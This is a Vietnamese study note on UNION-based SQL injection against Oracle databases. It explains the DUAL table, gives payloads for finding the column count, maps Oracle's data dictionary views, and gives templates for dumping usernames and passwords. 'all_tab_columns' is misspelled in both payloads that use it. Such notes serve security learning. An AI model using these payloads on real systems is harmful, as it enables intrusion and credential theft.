- Câu lệnh SELECT trong Oracle bắt buộc phải có mệnh đề FROM

=> Không giống như các hệ QTCSDL khác khi có thể viết câu lệnh SELECT độc lập mà không cần lấy dữ liệu từ đâu (Ví dụ: `SELECT 'abc', NULL`). Nhưng trong Oracle điều này là không hợp lệ

==> Cách giải quyết: Bảng ảo DUAL. Sẽ giúp Oracle hiểu ta đang chọn bảng nào

- Bản chất câu lệnh `SELECT 'a', 'b', 'c' FROM <table_name>'` là: với mỗi dòng tìm thấy, nó sẽ in ra 3 cột chứa 'a', 'b', 'c'

- Thay vì chỉ viết `' UNION SELECT NULL -- ` ta viết payload
  ```sql
  ' UNION SELECT NULL FROM DUAL -- (Hoặc ' UNION SELECT NULL, NULL FROM DUAL -- ; tóm lại đến khi nó khớp số cột thì web sẽ load bình thường)
  ```

  - Sau khi điều tra được số cột, ta dựa vào cấu trúc này của OracleDB

```
                        ORACLE DATA DICTIONARY
┌───────────────────────────────┐
│         ALL_USERS             │
├───────────────────────────────┤
│ USERNAME                      │
│ USER_ID                       │
│ CREATED                       │
└──────────────┬────────────────┘
               │ owner
               ▼

┌───────────────────────────────┐
│         ALL_TABLES            │
├───────────────────────────────┤
│ OWNER                         │
│ TABLE_NAME                    │
│ TABLESPACE_NAME               │
│ STATUS                        │
└──────────────┬────────────────┘
               │ owner + table_name
               ▼

┌───────────────────────────────┐
│       ALL_TAB_COLUMNS         │
├───────────────────────────────┤
│ OWNER                         │
│ TABLE_NAME                    │
│ COLUMN_NAME                   │
│ DATA_TYPE                     │
│ COLUMN_ID                     │
└───────────────────────────────┘
```

- Dựa vào cấu trúc bảng ta làm tương tự như quy trình với non-Oracle databases

=> Nói chung payload tìm các cột trong `table_name` phải có dạng:

```sql
' UNION SELECT column_name, NULL FROM all_tab_colums WHERE table_name = 'TABLE_....' --
```

Nguyên nhân là trong bảng all_tab_colums thì có 2 cột `table_name`, `column_name` nên mới có thể `SELECT column_name` và `WHERE table_name = '...' -- ` được

* Giờ sau khi đã có: tên bảng từ việc dump table_name, tên cột từ column_name. Ta tiến hành dump data từ đó ra để tìm username và password. Ví dụ:

```sql
' UNION SELECT USERNAME_..., PASSWORD_.... FROM <USERS_...> -- 
```
